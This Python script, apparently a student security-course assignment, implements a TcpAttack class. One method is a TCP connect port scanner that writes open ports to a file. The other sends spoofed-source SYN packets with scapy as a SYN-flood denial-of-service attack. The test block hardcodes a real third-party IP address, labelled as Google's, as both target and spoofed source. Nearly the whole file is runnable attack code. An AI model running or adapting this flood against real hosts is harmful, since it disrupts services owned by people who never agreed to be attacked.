#!/usr/bin/env python3
# Matthew Bolda


import sys
import socket
import re
import os.path
import scapy
from scapy.all import *
from scapy.layers.inet import IP, TCP


class TcpAttack:
    # spoofIP: String containing the IP address to spoof
    # targetIP: String containing the IP address of the target computer to attack
    def __init__(self, spoofIP, targetIP):
        self.spoofIP = spoofIP
        self.targetIP = targetIP
        return

    # rangeStart: Integer designating the first port in the range of ports being scanned.
    # rangeEnd: Integer designating the last port in the range of ports being scanned
    # No return value, but writes open ports to openports.txt
    def scanTarget(self, rangeStart, rangeEnd):

        # These lines were taken from lecture code port_scan.py and modified for this assignment
        open_ports = []  # (5)
        # Scan the ports in the specified range:
        for testport in range(rangeStart, rangeEnd + 1):  # (6)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # (7)
            sock.settimeout(0.1)  # (8)
            # if the port connects add it to the list
            try:  # (9)
                sock.connect((self.targetIP, testport))  # (10)
                open_ports.append(testport)  # (11)
            # do nothing if the port does not connect
            except:  # (15)
                pass

        # if the list is not empty fill openports.txt with available ports
        OUT = open('openports.txt', 'w')
        if open_ports:
            length = len(open_ports)
            i = 1
            for print_port in open_ports:
                OUT.write(str(print_port))
                if i < length:
                    new_line = '\n'
                    OUT.write(new_line)
                i = i+1
        OUT.close()

        return

    # port: Integer designating the port that the attack will use
    # numSyn: Integer of SYN packets to send to target IP address at the given port
    # If the port is open, perform DoS attack and return 1. Otherwise return 0.
    def attackTarget(self, port, numSyn):

        # make sure the port is actually open
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.1)
        result = sock.connect_ex((self.targetIP, port))
        if result != 0:
            return 0

        # This is taken from lecture code DoS5.py, modified to work for this assignment
        # For loop for the number of packets we want to send
        for i in range(numSyn):  # (5)
            # Creating the packet that will be sent
            IP_header = IP(src=self.spoofIP, dst=self.targetIP)  # (6)
            TCP_header = TCP(flags="S", sport=RandShort(), dport=port)  # (7)
            packet = IP_header / TCP_header  # (8)
            # attempting to send the packet
            try:  # (9)
                send(packet)  # (10)
            except Exception as e:  # (11)
                print(e)  # (11)

        return 1


# This function takes no input
# main is used to test function
if __name__ == "__main__":

    spoofIP = '172.217.4.46'  #IP from google
    targetIP = '172.217.4.46' #IP from google
    rangeStart = 75
    rangeEnd = 450
    port = 443

    Tcp = TcpAttack(spoofIP, targetIP)
    Tcp.scanTarget(rangeStart, rangeEnd)
    if Tcp.attackTarget(port, 10):
        print('port was open to attack')
    else:
        print('port was closed')
